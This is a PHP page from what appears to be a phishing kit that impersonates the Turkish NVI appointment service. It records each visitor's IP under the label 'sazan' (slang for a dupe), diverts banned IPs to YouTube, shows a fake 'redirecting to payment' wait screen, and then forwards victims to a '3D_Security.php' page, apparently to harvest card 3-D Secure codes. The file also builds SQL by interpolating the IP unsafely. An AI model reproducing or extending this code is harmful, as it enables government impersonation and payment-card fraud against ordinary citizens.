<?php
   date_default_timezone_set('Europe/Istanbul');
   include(__DIR__ . "/Core/getRealIPAdress.php");
   include(__DIR__ . "/Core/mobileDetect.php");
   include(__DIR__ . "/Core/browserDetect.php");
   include(__DIR__ . "/Connection.php");

   ob_start(); 
   session_start(); 

   
   $ip = getUserIP();

   $db->query("UPDATE sazan SET now = 'Bekletme Ekranında' WHERE ip = '{$ip}'");

   
   $ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
   foreach($ban as $kontrol){
       if($kontrol['ban'] == $ip){ 
           header('Location:https://www.youtube.com/watch?v=D4Ici4i8_3A&ab_channel=Epha');
       } 
   }
   
  // $person_waiting_time_sorgulama = $db->query("SELECT person_waiting_time FROM site WHERE id = '1'")->fetch(PDO::FETCH_ASSOC);
   
   $person_waiting_time_sorgulama = $db->query("SELECT person_waiting_time FROM site WHERE id = '1'");
$person_waiting_time_sorgulandi = $person_waiting_time_sorgulama->fetchColumn();
   
   
   $odemebeklet = $person_waiting_time_sorgulandi;
   
  // echo $odemebeklet;
  
  //Updated Discord/.yusufo ; GeceMavisi - Yusuf;
   
   header( "refresh:".$odemebeklet.";url=3D_Security.php" );
   
   ?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
    <title>Randevu Al - NVI</title>
    <link rel="stylesheet" href="general_css/style.css">
	<style>
		@media(max-width:768px){
			form{
			width: 100% !important;
			}
		}
	</style>
</head>

<body>

    <div class="container" style="background:#fff">
			 <img src="general_css/nvi.png" style="width:350px;position:absolute;top:10px"> 

        <form action="" method="post" style="padding-top:0px;box-shadow:none">
            <div class="flexbox">
                <div class="inputBox" style="text-align:center;">
                    <img src="general_css/loading-gif.gif" width="150" alt="Başarılı Gif">
                    <h2 style="text-transform:none">Lütfen Bekleyiniz Ödemeye Yönlendiriliyorsunuz..</h2>
                    
                </div>
            </div>

            <input type="hidden" id="token" name="token" value="<?= $sessionToken ?>">
        </form>
    </div>
    <script type="text/javascript">
        $(function () {
            $('#button-close').on('click', function () {
                $(this).closest('.modal-wrapper').fadeOut(500);
            });

            $('input[name=imageControl]').addClass("required captcha_css");


            var form = document.getElementById("form");

            document.getElementById("allahbum").addEventListener("click", function () {
                form.submit();
            });
        });

        setTimeout(function () {
            var viewheight = $(window).height();
            var viewwidth = $(window).width();
            var viewport = $("meta[name=viewport]");
            viewport.attr("content", "height=" + viewheight + "px, width=" +
                viewwidth + "px, initial-scale=1.0");
        }, 300);
    </script>
   